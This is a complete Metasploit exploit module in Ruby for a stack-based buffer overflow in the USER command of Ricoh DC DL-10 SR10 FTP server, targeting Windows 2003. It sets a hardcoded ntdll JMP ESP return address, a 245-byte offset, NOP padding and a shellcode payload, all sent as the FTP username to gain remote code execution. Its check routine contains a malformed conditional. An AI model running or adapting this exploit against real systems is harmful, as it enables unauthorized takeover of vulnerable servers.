# This can be imported into MSF as there's no current module for this ancient target. 

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Ricoh DC DL-10 SR10 FTP USER Command Stack-based Buffer Overflow',
        'Description' => <<~DESC.strip,
          This module exploits a vulnerability found in Ricoh DC's DL-10 SR10 FTP
          service. Exploitation is conditional upon the server being configured
          and running the log file enabled.
        DESC
        'Author' => [
          'Julien Ahrens', #Discovery, PoC
          'JM5' #Metasploit
        ],
        'References' => [
          ['OSVDB', '79691'],
          ['URL', 'http://secunia.com/advisories/47912'],
          ['URL', 'http://www.inshell.net/2012/03/ricoh-dc-software-dl-10-ftp-server-sr10-exe-remote-buffer-overflow-vulnerability/']
        ],
        'Payload' => {
          'BadChars' => "\x00",
        },
        'Platform' => 'win',
        'Targets' => [
          [
            'Windows 2003',
            {
              'Ret' => 0x77FB8BAB, #JMP ESP; RETN [ntdll.dll]
              'Offset' => 245
            }
          ]
        ],
        'Privileged' => false,
        'DisclosureDate' => 'Mar 1 2012',
        'DefaultTarget' => 0
      )
    )

    # Deregister of redundant options
    
    deregister_options('FTPPASS', 'FTPUSER')
  end

  def check
    connect
    disconnect
    if banner =~ /220 DSC ftpd 1\.0 FTP Server/
      Exploit::CheckCode::Detected
    elsif
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    bad_chars = payload_badchars
    buf = "#{rand_text_alpha(target['Offset'], bad_chars)}#{[target.ret].pack('V')}#{make_nops(20)}#{payload.encoded}"

    print_status("#{rhost}:#{rport} - Sending #{self.name}")
    connect
    send_user(buf)
    handler
    disconnect
  end
end
